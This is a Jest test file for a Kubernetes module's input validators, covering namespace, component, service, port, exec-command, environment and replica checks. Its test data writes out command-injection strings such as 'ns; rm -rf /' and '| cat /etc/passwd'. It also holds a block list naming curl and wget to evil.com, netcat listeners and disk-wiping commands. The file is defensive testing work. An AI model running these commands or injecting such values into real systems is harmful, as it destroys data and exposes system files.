/**
 * k8s.security.test.js - Security Tests for Kubernetes Module
 * 
 * Tests input validation and security hardening for the k8s module:
 * - Namespace validation (prevents command injection)
 * - Component name validation (whitelist-based)
 * - Service name validation (whitelist-based)
 * - Port validation (prevents privileged ports)
 * - Command validation (prevents shell injection and blocked commands)
 * - Environment validation
 * - Replica count validation
 */

const {
  validateNamespace,
  validateComponent,
  validateService,
  validatePort,
  validateExecCommand,
  validateEnvironment,
  validateReplicas,
  VALID_COMPONENTS,
  VALID_SERVICES,
  MAX_NAMESPACE_LENGTH,
} = require('../lib/k8s');

describe('K8s Security - Input Validation', () => {
  describe('validateNamespace', () => {
    test('should accept valid namespace names', () => {
      const validNamespaces = [
        'masterclaw',
        'my-namespace',
        'app-123',
        'a',
        'a-b-c',
        'dev',
        'prod',
        'staging',
      ];
      for (const ns of validNamespaces) {
        const result = validateNamespace(ns);
        expect(result.valid).toBe(true);
        expect(result.error).toBeUndefined();
      }
    });

    test('should reject empty namespace', () => {
      const result = validateNamespace('');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('required');
    });

    test('should reject null namespace', () => {
      const result = validateNamespace(null);
      expect(result.valid).toBe(false);
    });

    test('should reject undefined namespace', () => {
      const result = validateNamespace(undefined);
      expect(result.valid).toBe(false);
    });

    test('should reject non-string namespace', () => {
      const result = validateNamespace(123);
      expect(result.valid).toBe(false);
    });

    test('should reject namespace with shell metacharacters', () => {
      const maliciousNamespaces = [
        'ns; rm -rf /',
        'ns | cat /etc/passwd',
        'ns && evil',
        'ns$(whoami)',
        'ns`id`',
        'ns\nevil',
        'ns\revil',
        'ns*',
        'ns?',
        'ns~',
        'ns!',
        'ns{cmd}',
        'ns[cmd]',
        'ns(cmd)',
        'ns<cmd>',
        "ns'quote",
        'ns"quote',
        'ns\\backslash',
        'ns$dollar',
      ];
      for (const ns of maliciousNamespaces) {
        const result = validateNamespace(ns);
        expect(result.valid).toBe(false);
        // Error can be either DNS pattern or shell metacharacter check
        expect(result.error).toMatch(/valid DNS|invalid|metacharacters/);
      }
    });

    test('should reject namespace starting with hyphen', () => {
      const result = validateNamespace('-invalid');
      expect(result.valid).toBe(false);
    });

    test('should reject namespace ending with hyphen', () => {
      const result = validateNamespace('invalid-');
      expect(result.valid).toBe(false);
    });

    test('should reject uppercase letters', () => {
      const result = validateNamespace('InvalidNamespace');
      expect(result.valid).toBe(false);
    });

    test('should reject underscores', () => {
      const result = validateNamespace('invalid_namespace');
      expect(result.valid).toBe(false);
    });

    test('should reject dots', () => {
      const result = validateNamespace('invalid.namespace');
      expect(result.valid).toBe(false);
    });

    test('should reject namespace exceeding max length', () => {
      const longNs = 'a'.repeat(MAX_NAMESPACE_LENGTH + 1);
      const result = validateNamespace(longNs);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('exceeds maximum');
    });

    test('should accept namespace at max length', () => {
      const maxNs = 'a'.repeat(MAX_NAMESPACE_LENGTH);
      const result = validateNamespace(maxNs);
      expect(result.valid).toBe(true);
    });

    test('should trim whitespace before validation', () => {
      const result = validateNamespace('  masterclaw  ');
      // Note: The validation doesn't trim, but the result should be false
      // because spaces are not valid characters
      expect(result.valid).toBe(false);
    });
  });

  describe('validateComponent', () => {
    test('should accept valid component names', () => {
      for (const component of VALID_COMPONENTS) {
        const result = validateComponent(component);
        expect(result.valid).toBe(true);
        expect(result.error).toBeUndefined();
      }
    });

    test('should accept valid component names (case insensitive)', () => {
      const upperComponents = VALID_COMPONENTS.map(c => c.toUpperCase());
      for (const component of upperComponents) {
        const result = validateComponent(component);
        expect(result.valid).toBe(true);
      }
    });

    test('should reject invalid component names', () => {
      const invalidComponents = [
        'invalid',
        'shell; rm -rf /',
        '../../../etc/passwd',
        'pod-123',
        'user-container',
        '',
      ];
      for (const component of invalidComponents) {
        const result = validateComponent(component);
        expect(result.valid).toBe(false);
      }
    });

    test('should return helpful error message', () => {
      const result = validateComponent('invalid');
      expect(result.error).toContain('Invalid component');
      expect(result.error).toContain('core');
    });

    test('should reject empty component', () => {
      const result = validateComponent('');
      expect(result.valid).toBe(false);
    });

    test('should reject null component', () => {
      const result = validateComponent(null);
      expect(result.valid).toBe(false);
    });
  });

  describe('validateService', () => {
    test('should accept valid service names', () => {
      for (const service of VALID_SERVICES) {
        const result = validateService(service);
        expect(result.valid).toBe(true);
      }
    });

    test('should accept valid service names (case insensitive)', () => {
      const upperServices = VALID_SERVICES.map(s => s.toUpperCase());
      for (const service of upperServices) {
        const result = validateService(service);
        expect(result.valid).toBe(true);
      }
    });

    test('should reject invalid service names', () => {
      const invalidServices = [
        'invalid',
        'api; rm -rf /',
        'kubernetes',
        'kube-system',
        '',
      ];
      for (const service of invalidServices) {
        const result = validateService(service);
        expect(result.valid).toBe(false);
      }
    });

    test('should return helpful error message', () => {
      const result = validateService('invalid');
      expect(result.error).toContain('Invalid service');
    });
  });

  describe('validatePort', () => {
    test('should accept valid unprivileged ports', () => {
      const validPorts = [1024, 8080, 3000, 8000, 9000, 65535];
      for (const port of validPorts) {
        const result = validatePort(port);
        expect(result.valid).toBe(true);
        expect(result.port).toBe(port);
      }
    });

    test('should accept port as string', () => {
      const result = validatePort('8080');
      expect(result.valid).toBe(true);
      expect(result.port).toBe(8080);
    });

    test('should reject privileged ports', () => {
      const privilegedPorts = [1, 80, 443, 1023];
      for (const port of privilegedPorts) {
        const result = validatePort(port);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('Privileged ports');
      }
    });

    test('should reject port 0', () => {
      const result = validatePort(0);
      expect(result.valid).toBe(false);
    });

    test('should reject negative ports', () => {
      const result = validatePort(-1);
      expect(result.valid).toBe(false);
    });

    test('should reject ports above 65535', () => {
      const result = validatePort(65536);
      expect(result.valid).toBe(false);
    });

    test('should reject non-numeric ports', () => {
      const result = validatePort('abc');
      expect(result.valid).toBe(false);
    });

    test('should reject empty port', () => {
      const result = validatePort('');
      expect(result.valid).toBe(false);
    });

    test('should reject null port', () => {
      const result = validatePort(null);
      expect(result.valid).toBe(false);
    });
  });

  describe('validateExecCommand', () => {
    test('should accept safe commands', () => {
      const safeCommands = [
        'ls',
        'ls -la',
        'cat file.txt',
        'ps aux',
        'echo hello',
        'pwd',
        'whoami',
        'date',
        'df -h',
        'uptime',
        'top',
        'free',
      ];
      for (const cmd of safeCommands) {
        const result = validateExecCommand(cmd);
        if (!result.valid) {
          console.log(`Failed for command: "${cmd}", error: ${result.error}`);
        }
        expect(result.valid).toBe(true);
        expect(result.args).toBeDefined();
      }
    });

    test('should reject commands with shell metacharacters', () => {
      const dangerousCommands = [
        'sh; rm -rf /',
        'ls | cat /etc/passwd',
        'echo hello && evil',
        'sh $(whoami)',
        'sh `id`',
        'echo\nrm -rf /',
        'ls | rev',
        'sh & background',
        'echo $PATH',
        "echo 'quote",
        'echo "quote',
        'echo\\backslash',
        'echo |',
        'sh;',
        'ls && cat',
      ];
      for (const cmd of dangerousCommands) {
        const result = validateExecCommand(cmd);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('shell metacharacters');
      }
    });

    test('should reject blocked commands', () => {
      const blockedCommands = [
        'rm file.txt',
        'dd if=/dev/zero',
        'mkfs.ext4 /dev/sda',
        'fdisk -l',
        'wget http://evil.com',
        'curl http://evil.com',
        'nc -l -p 1234',
        'netcat -l -p 1234',
        'bash -c evil',
        'sh -c evil',
        'python script.py',
        'perl script.pl',
        'ruby script.rb',
        'php script.php',
        'node script.js',
        'nodejs script.js',
      ];
      for (const cmd of blockedCommands) {
        const result = validateExecCommand(cmd);
        if (result.valid) {
          console.log(`Command "${cmd}" should have been blocked but was accepted`);
        }
        expect(result.valid).toBe(false);
        expect(result.error).toContain('not allowed');
      }
    });

    test('should reject commands with path traversal', () => {
      const traversalCommands = [
        '../bin/evil',
        '../../etc/passwd',
        '/bin/sh',
        '/usr/bin/cat',
      ];
      for (const cmd of traversalCommands) {
        const result = validateExecCommand(cmd);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('Absolute paths');
      }
    });

    test('should reject empty command', () => {
      const result = validateExecCommand('');
      expect(result.valid).toBe(false);
    });

    test('should reject null command', () => {
      const result = validateExecCommand(null);
      expect(result.valid).toBe(false);
    });

    test('should split command into args array', () => {
      const result = validateExecCommand('ls -la /app');
      expect(result.valid).toBe(true);
      expect(result.args).toEqual(['ls', '-la', '/app']);
    });

    test('should handle multiple spaces', () => {
      const result = validateExecCommand('ls   -la');
      expect(result.valid).toBe(true);
      expect(result.args).toEqual(['ls', '-la']);
    });
  });

  describe('validateEnvironment', () => {
    test('should accept valid environments', () => {
      const validEnvs = ['dev', 'development', 'staging', 'prod', 'production', 'test'];
      for (const env of validEnvs) {
        const result = validateEnvironment(env);
        expect(result.valid).toBe(true);
      }
    });

    test('should accept valid environments (case insensitive)', () => {
      const mixedEnvs = ['Dev', 'DEV', 'Staging', 'STAGING', 'Prod', 'PROD'];
      for (const env of mixedEnvs) {
        const result = validateEnvironment(env);
        expect(result.valid).toBe(true);
      }
    });

    test('should reject invalid environments', () => {
      const invalidEnvs = [
        'invalid',
        'production-env; rm -rf /',
        'dev|cat',
        'prod&&evil',
        '',
      ];
      for (const env of invalidEnvs) {
        const result = validateEnvironment(env);
        expect(result.valid).toBe(false);
      }
    });

    test('should reject empty environment', () => {
      const result = validateEnvironment('');
      expect(result.valid).toBe(false);
    });
  });

  describe('validateReplicas', () => {
    test('should accept valid replica counts', () => {
      const validReplicas = [0, 1, 5, 10, 50, 100];
      for (const replicas of validReplicas) {
        const result = validateReplicas(replicas);
        expect(result.valid).toBe(true);
        expect(result.replicas).toBe(replicas);
      }
    });

    test('should accept replicas as string', () => {
      const result = validateReplicas('5');
      expect(result.valid).toBe(true);
      expect(result.replicas).toBe(5);
    });

    test('should reject negative replicas', () => {
      const result = validateReplicas(-1);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('non-negative');
    });

    test('should reject replicas above 100', () => {
      const result = validateReplicas(101);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Maximum 100');
    });

    test('should reject non-numeric replicas', () => {
      const result = validateReplicas('abc');
      expect(result.valid).toBe(false);
    });

    test('should reject empty replicas', () => {
      const result = validateReplicas('');
      expect(result.valid).toBe(false);
    });
  });
});

describe('K8s Security - Constants', () => {
  test('VALID_COMPONENTS should be defined', () => {
    expect(VALID_COMPONENTS).toBeDefined();
    expect(Array.isArray(VALID_COMPONENTS)).toBe(true);
    expect(VALID_COMPONENTS).toContain('core');
    expect(VALID_COMPONENTS).toContain('backend');
  });

  test('VALID_SERVICES should be defined', () => {
    expect(VALID_SERVICES).toBeDefined();
    expect(Array.isArray(VALID_SERVICES)).toBe(true);
    expect(VALID_SERVICES.length).toBeGreaterThanOrEqual(VALID_COMPONENTS.length);
  });

  test('MAX_NAMESPACE_LENGTH should be 63', () => {
    expect(MAX_NAMESPACE_LENGTH).toBe(63);
  });
});

describe('K8s Security - Command Injection Prevention', () => {
  test('should prevent command injection via namespace', () => {
    const injectionAttempts = [
      'masterclaw; kubectl delete all --all',
      'masterclaw | cat /etc/passwd',
      'masterclaw && rm -rf /',
      'masterclaw$(whoami)',
      'masterclaw`id`',
    ];
    for (const attempt of injectionAttempts) {
      const result = validateNamespace(attempt);
      expect(result.valid).toBe(false);
    }
  });

  test('should prevent command injection via component', () => {
    const injectionAttempt = 'core; rm -rf /';
    const result = validateComponent(injectionAttempt);
    expect(result.valid).toBe(false);
  });

  test('should prevent command injection via service', () => {
    const injectionAttempt = 'core; rm -rf /';
    const result = validateService(injectionAttempt);
    expect(result.valid).toBe(false);
  });

  test('should prevent shell injection via exec command', () => {
    const injectionAttempts = [
      'sh -c "rm -rf /"',
      'bash -c evil',
      'sh; cat /etc/passwd',
      'sh | rev',
    ];
    for (const attempt of injectionAttempts) {
      const result = validateExecCommand(attempt);
      expect(result.valid).toBe(false);
    }
  });
});
